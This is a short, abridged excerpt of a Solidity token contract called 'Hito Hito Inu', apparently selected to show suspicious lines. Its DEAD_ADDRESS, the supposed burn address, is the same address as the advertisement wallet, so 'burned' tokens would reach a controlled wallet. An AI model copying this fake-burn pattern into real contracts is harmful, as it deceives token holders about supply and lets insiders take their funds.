...
contract HitoHitoInu is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 1000*1e4* 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
 
    string private _name = "Hito Hito Inu";
    ...
    address public  advertisementWallet = 0x7dE16B59B33891121E8dF8d68065091657094248;
 
 
    uint256 public _advestisementFee = _buyAdvestisementFee;
    uint256 private _previousAdvestisementFee = _advestisementFee;
 
    address public constant DEAD_ADDRESS = 0x7dE16B59B33891121E8dF8d68065091657094248;
 
    uint256 public _maxTxAmount = 1000*1e4  * 10**18;
    ...
    function removeAllFee() private {
        if(_taxFee == 5 && _advestisementFee == 5 && _burnFee ==2 ) return;
